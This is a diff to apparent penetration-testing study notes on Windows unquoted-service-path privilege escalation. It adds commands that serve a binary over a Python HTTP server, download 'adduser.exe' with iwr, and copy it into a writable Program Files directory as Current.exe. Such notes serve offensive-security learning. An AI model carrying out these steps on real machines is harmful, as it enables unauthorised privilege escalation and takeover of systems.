@@ -31,13 +31,19 @@ as always when working with services, to determine if our current user has the p
     PS > Start-Service myservice
     PS > Stop-Service myservice
 
-now we can uses icalcs to check the permissions of the service binary directories
+now we can uses icalcs to check the permissions of the service binary directories - check each dir
 
     PS > icacls "C:\Program Files\Enterprise Apps" (...\Current Version\nyservice.exe)
 
 in this example we have write permissions available to the current user for the Enterprise Apps directory
 
-so we can copy our malicious executable over - and lable it Current.exe as the next path it is looking for is Curent Version
+so we can copy our malicious executable over - and label it Current.exe as the next path it is looking for is Curent Version
+
+start our python server
+
+    $ python3 -m http.server 80
+
+now import the our binary
 
     PS > iwr -uri http://192.168.1.1/adduser.exe -Outfile Current.exe
     PS > copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
